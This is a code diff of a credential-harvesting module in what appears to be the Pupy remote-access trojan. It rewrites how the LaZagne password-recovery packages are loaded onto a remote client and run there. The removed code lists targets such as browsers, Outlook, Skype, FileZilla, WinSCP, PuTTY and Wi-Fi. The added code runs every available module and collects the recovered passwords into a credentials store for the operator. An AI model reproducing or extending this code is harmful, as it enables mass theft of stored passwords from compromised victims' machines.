@@ -35,39 +35,20 @@ class LaZagne(PupyModule):
             self.client.load_package("win32api")
             self.client.load_package("win32con")
             self.client.load_package("win32cred")
-            self.client.load_package("lazagne.dico")
-            self.client.load_package("lazagne.pbkdf2")
-            
-            # run all modules
-            modules = {
-                "Browsers": ["chrome", "ie", "mozilla", "opera"], 
-                "Chats": ["jitsi", "pidgin", "skype"],
-                "Databases": ["dbvisualizer", "sqldeveloper", "squirrel"],
-                "Games": ["galconfusion", "kalypsomedia", "roguestale", "turba"], 
-                "Git": ["gitforwindows"],
-                "Mails": ["outlook"], 
-                "SVN": ["tortoise"], 
-                "Sysadmin": ["coreftp", "cyberduck", "filezilla", "ftpnavigator", "puttycm", "winscp"], 
-                "Wifi": ["wifi"], 
-                "Windows": ["dot_net", "network"]
-            }
+            self.client.load_package("colorama")
+            self.client.load_package("impacket")
+            self.client.load_package("calendar")
+            self.client.load_package("win32security")
+            self.client.load_package("win32net")
+            self.client.load_package("lazagne")
 
             db = Credentials()
-            for m in modules.keys():
-                for module in modules[m]:
-                    self.client.load_package("lazagne.%s" % module)
-                    out = self.client.conn.modules["lazagne.%s" % module]
-                    c = getattr(out, module.capitalize())
-                    if module == "mozilla":
-                        passwords = c().run("Firefox")
-                        self.print_results("Firefox", passwords, db)
-                        
-                        passwords = c().run("Thunderbird")
-                        self.print_results("Thunderbird", passwords, db)
-                    else:
-                        passwords = c().run()
-                        self.print_results(module, passwords, db)
-        
+
+            moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
+            for module in moduleNames:
+                passwords = module.run(module.options['dest'].capitalize())
+                self.print_results(module.options['dest'].capitalize(), passwords, db)
+            
         elif "Linux" in platform:
             isWindows = False
             if "64" in self.client.desc["os_arch"]:
